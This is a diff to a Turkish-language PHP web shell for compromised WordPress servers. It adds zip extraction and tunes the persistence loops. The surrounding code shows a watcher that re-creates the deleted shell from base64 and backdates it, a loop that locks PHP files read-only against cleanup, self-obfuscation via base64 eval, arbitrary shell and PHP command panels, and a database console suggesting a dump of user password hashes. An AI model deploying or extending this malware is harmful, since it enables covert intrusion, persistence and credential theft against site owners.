@@ -114,7 +114,31 @@ function safeExec($cmd) {
 }
 function humanFilesize($b, $d = 2) { $s = ['B','kB','MB','GB','TB']; $f = floor((strlen($b)-1)/3); return sprintf("%.{$d}f", $b/pow(1024,$f)).' '.$s[$f]; }
 function manualTimestomp($t, $cd = null) { $ts = $cd ? strtotime($cd) : (file_exists($_SERVER['DOCUMENT_ROOT'].'/wp-login.php') ? filemtime($_SERVER['DOCUMENT_ROOT'].'/wp-login.php') : (time()-63072000)); return @touch($t,$ts) ? date("d-m-Y H:i",$ts) : false; }
-// ============== YARDIMCI FONKSİYONLAR SONU ==============
+
+// ============== ZIP ÇIKARMA FONKSİYONU ==============
+function extractZip($zipPath, $extractTo) {
+    if (class_exists('ZipArchive')) {
+        $zip = new ZipArchive;
+        if ($zip->open($zipPath) === TRUE) {
+            $zip->extractTo($extractTo);
+            $zip->close();
+            return ['success' => true, 'method' => 'ZipArchive'];
+        }
+    }
+    $result = safeExec('unzip -o ' . escapeshellarg($zipPath) . ' -d ' . escapeshellarg($extractTo) . ' 2>&1');
+    if ($result !== null && !str_contains($result, 'not found') && !str_contains($result, 'not installed')) {
+        return ['success' => true, 'method' => 'unzip', 'output' => $result];
+    }
+    if (class_exists('PharData')) {
+        try {
+            $phar = new PharData($zipPath);
+            $phar->extractTo($extractTo);
+            return ['success' => true, 'method' => 'PharData'];
+        } catch (Exception $e) {}
+    }
+    return ['success' => false, 'method' => 'none', 'error' => 'ZipArchive, unzip ve PharData kullanılamıyor.'];
+}
+// ============== ZIP ÇIKARMA FONKSİYONU SONU ==============
 
 // ============== WATCHER SİSTEMİ ==============
 $PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(SHELL_FILE), 0, 8) . '.json';
@@ -126,7 +150,7 @@ function deployWatcher($fp) {
     $sD = !empty($_SESSION['stealth_date']) ? $_SESSION['stealth_date'] : date("Y-m-d H:i:s", (time()-63072000));
     $sT = strtotime($sD);
     $wF = sys_get_temp_dir() . '/.w_' . substr(md5($fp), 0, 10) . '.sh';
-    $wS = "#!/bin/bash\nFILE=".escapeshellarg($fp)."\nTARGET_TS=".$sT."\nwhile true; do\n  if [ ! -f \"\$FILE\" ] || [ \$(stat -c %Y \"\$FILE\" 2>/dev/null) != \"\$TARGET_TS\" ]; then\n    echo ".escapeshellarg($fC)." | base64 -d > \"\$FILE\" 2>/dev/null; touch -d \"$sD\" \"\$FILE\" 2>/dev/null; chmod 644 \"\$FILE\" 2>/dev/null\n  fi\n  sleep 10\ndone\n";
+    $wS = "#!/bin/bash\nFILE=".escapeshellarg($fp)."\nTARGET_TS=".$sT."\nwhile true; do\n  if [ ! -f \"\$FILE\" ] || [ \$(stat -c %Y \"\$FILE\" 2>/dev/null) != \"\$TARGET_TS\" ]; then\n    echo ".escapeshellarg($fC)." | base64 -d > \"\$FILE\" 2>/dev/null; touch -d \"$sD\" \"\$FILE\" 2>/dev/null; chmod 644 \"\$FILE\" 2>/dev/null\n  fi\n  sleep 180\ndone\n";
     @file_put_contents($wF, $wS); @chmod($wF, 0755);
     safeExec('pkill -9 -f '.escapeshellarg(basename($wF)));
     $pid = safeExec('sh '.escapeshellarg($wF).' > /dev/null 2>&1 &');
@@ -137,7 +161,7 @@ function deployWatcher($fp) {
 // ============== FILE SHIELD ==============
 function deployGlobalShield($dir) {
     global $shieldFlagFile;
-    $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 300\ndone\n";
+    $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 180\ndone\n";
     $wFile = sys_get_temp_dir() . '/.global_w_' . substr(md5($dir), 0, 10) . '.sh';
     @file_put_contents($wFile, $wScript);
     @chmod($wFile, 0755);
@@ -228,7 +252,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['unlock_config'])) { $msg = unlockWpConfig(); }
     if (isset($_POST['bypass_exec'])) { $msg = "🧪 Bypass Test Sonucu:\n" . safeExec('id'); }
 
-    if (isset($_POST['obfuscate_self'])) {
+        if (isset($_POST['obfuscate_self'])) {
         $originalFile = SHELL_FILE;
         $source = file_get_contents($originalFile);
         $obfuscated = '<?php eval(\'?>\'.base64_decode(\'' . base64_encode($source) . '\').\'<?php \'); ?>';
@@ -238,6 +262,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $msg = "❌ Obfuscate işlemi başarısız!";
         }
     }
+
+    // ====== ZIP DOSYASI AÇMA ======
+    if (isset($_POST['extract_zip']) && isset($_POST['zip_file'])) {
+        $zipFile = realpath($_POST['zip_file']);
+        if ($zipFile && is_file($zipFile)) {
+            $result = extractZip($zipFile, dirname($zipFile));
+            if ($result['success']) {
+                $msg = "📦 Zip başarıyla açıldı! (Yöntem: {$result['method']})";
+            } else {
+                $msg = "❌ Zip açılamadı! " . $result['error'];
+            }
+        } else {
+            $msg = "❌ Geçersiz zip dosyası!";
+        }
+    }
+    // ====== ZIP DOSYASI AÇMA SONU ======
 
     if (isset($_FILES['u'])) {
         $t = $_SESSION['upload_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['u']['name']);
@@ -418,7 +458,7 @@ switch ($action) {
         ?><h3>Dosya Yöneticisi</h3>
         <div class="breadcrumb"><span>📍</span><?php $cp=$_SESSION['upload_dir'];$parts=explode('/',trim($cp,'/'));$bp='';echo '<a href="?action=files&chdir=/">/</a>';foreach($parts as $i=>$part){$bp.='/'.$part;echo ' <a href="?action=files&chdir='.urlencode($bp).'">'.htmlspecialchars($part).'</a> /';}?><form method="post" style="display:inline-flex;gap:4px;align-items:center;margin-left:auto;"><input type="text" name="goto_dir" placeholder="Dizin yolu..." style="width:140px;font-size:12px;padding:5px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">Git</button></form><a href="?goto_root=1" class="btn btn-blue" style="margin-left:4px;padding:5px 10px;font-size:12px;">🏠 ROOT</a><a href="?chdir=.." class="btn btn-blue" style="padding:5px 10px;font-size:12px;">⬅️ GERİ</a></div>
         <div style="margin-bottom:12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center;"><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newdirname" placeholder="Yeni dizin" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📁 Klasör Oluştur</button></form><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newfilename" placeholder="Yeni dosya" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📄 Dosya Oluştur</button></form><form method="post" enctype="multipart/form-data" style="display:flex;gap:5px;align-items:center;"><input type="file" name="u" style="width:auto;padding:5px;font-size:12px;"><button class="btn btn-green" style="padding:5px 10px;font-size:12px;">⬆️ Yükle & Koru</button></form></div>
-        <?php $wl=getWatchers(); ?><table><tr><th class="col-file">İsim</th><th class="col-size">Boyut</th><th class="col-perm">İzin</th><th class="col-date">Değiştirme</th><th class="col-act">İşlem</th></tr><?php $items=@array_diff(scandir($_SESSION['upload_dir']),['.','..']);if($items):foreach($items as $i):$full=$_SESSION['upload_dir'].'/'.$i;$isDir=is_dir($full);$perm=substr(sprintf('%o',fileperms($full)),-4);$size=$isDir?'-':humanFilesize(filesize($full));$modTime=date("Y-m-d H:i:s",filemtime($full));$link=$isDir?"?action=files&chdir=".urlencode($i):"#";$name=$isDir?"<a href='$link' style='color:#f0883e;'>📁 $i</a>":htmlspecialchars($i);$actions='';if(!$isDir){$ep=urlencode($full);$rp=realpath($full);$ip=isset($wl[$rp]);$actions.="<div class='file-actions'>";$actions.="<a href='?action=files&edit=$ep' class='btn btn-blue'>✏️ Düzenle</a>";$actions.="<a href='?action=download&file=$ep' class='btn btn-green'>⬇️ İndir</a>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";if($ip){$actions.=" <span class='status-badge' style='background:var(--success);font-size:10px;padding:2px 6px;'>🛡️</span>";}else{$actions.=" <a href='?action=protect&file=$ep' class='btn btn-purple'>🔒 Koru</a>";}$actions.="</div>";}else{$ep=urlencode($full);$actions.="<div class='file-actions'>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";$actions.="</div>";}echo "<tr><td>$name</td><td>$size</td><td>$perm</td><td>$modTime</td><td class='col-act'>$actions</td></tr>";endforeach;endif;?></table><?php break;
+        <?php $wl=getWatchers(); ?><table><tr><th class="col-file">İsim</th><th class="col-size">Boyut</th><th class="col-perm">İzin</th><th class="col-date">Değiştirme</th><th class="col-act">İşlem</th></tr><?php $items=@array_diff(scandir($_SESSION['upload_dir']),['.','..']);if($items):foreach($items as $i):$full=$_SESSION['upload_dir'].'/'.$i;$isDir=is_dir($full);$perm=substr(sprintf('%o',fileperms($full)),-4);$size=$isDir?'-':humanFilesize(filesize($full));$modTime=date("Y-m-d H:i:s",filemtime($full));$link=$isDir?"?action=files&chdir=".urlencode($i):"#";$name=$isDir?"<a href='$link' style='color:#f0883e;'>📁 $i</a>":htmlspecialchars($i);$actions='';if(!$isDir){$ext=strtolower(pathinfo($i,PATHINFO_EXTENSION));$ep=urlencode($full);$rp=realpath($full);$ip=isset($wl[$rp]);$actions.="<div class='file-actions'>";$actions.="<a href='?action=files&edit=$ep' class='btn btn-blue'>✏️ Düzenle</a>";$actions.="<a href='?action=download&file=$ep' class='btn btn-green'>⬇️ İndir</a>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";if($ext==='zip'){$actions.="<form method='post' style='display:inline;'><input type='hidden' name='zip_file' value='".htmlspecialchars($full)."'><button type='submit' name='extract_zip' class='btn btn-orange' style='font-size:11px;padding:4px 8px;'>📦 Aç</button></form>";}if($ip){$actions.=" <span class='status-badge' style='background:var(--success);font-size:10px;padding:2px 6px;'>🛡️</span>";}else{$actions.=" <a href='?action=protect&file=$ep' class='btn btn-purple'>🔒 Koru</a>";}$actions.="</div>";}else{$ep=urlencode($full);$actions.="<div class='file-actions'>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";$actions.="</div>";}echo "<tr><td>$name</td><td>$size</td><td>$perm</td><td>$modTime</td><td class='col-act'>$actions</td></tr>";endforeach;endif;?></table><?php break;
     case 'cmd': ?><h3>Komut Çalıştır</h3><p style="color:var(--muted);font-size:12px;margin-bottom:8px;">ℹ️ Bypass modu aktif — tüm exec metotları sırayla deneniyor.</p><form method="post" class="flex-row"><input type="text" name="cmd_exec" placeholder="ls -la /" style="flex:1;"><button class="btn btn-blue">Çalıştır</button></form><?php if(isset($cmd_output)): ?><pre><?= htmlspecialchars($cmd_output) ?></pre><?php endif; break;
     case 'php': ?><h3>PHP Kodu Çalıştır</h3><form method="post"><textarea name="php_code" rows="30" style="width:100%;"><?= htmlspecialchars($_POST['php_code'] ?? 'echo "Merhaba Dünya";') ?></textarea><button class="btn btn-green" style="margin-top:8px;">Çalıştır</button></form><?php if(isset($php_output)): ?><pre><?= htmlspecialchars($php_output) ?></pre><?php endif; break;
     case 'wpdb': ?><h3>WordPress Veritabanı</h3><?php if(include_wp_db()): ?><form method="post"><textarea name="wp_query" rows="5" style="width:100%;" placeholder="SELECT user_login,user_pass FROM wp_users;"><?= htmlspecialchars($_POST['wp_query'] ?? '') ?></textarea><button class="btn btn-blue" style="margin-top:8px;">Sorgula</button></form><?php if(isset($db_result)): ?><pre><?php print_r($db_result); ?></pre><?php endif; ?><?php else: ?><p style="color:#da3633;font-size:14px;">wp-config.php bulunamadı veya bağlantı kurulamadı.</p><?php endif; break;
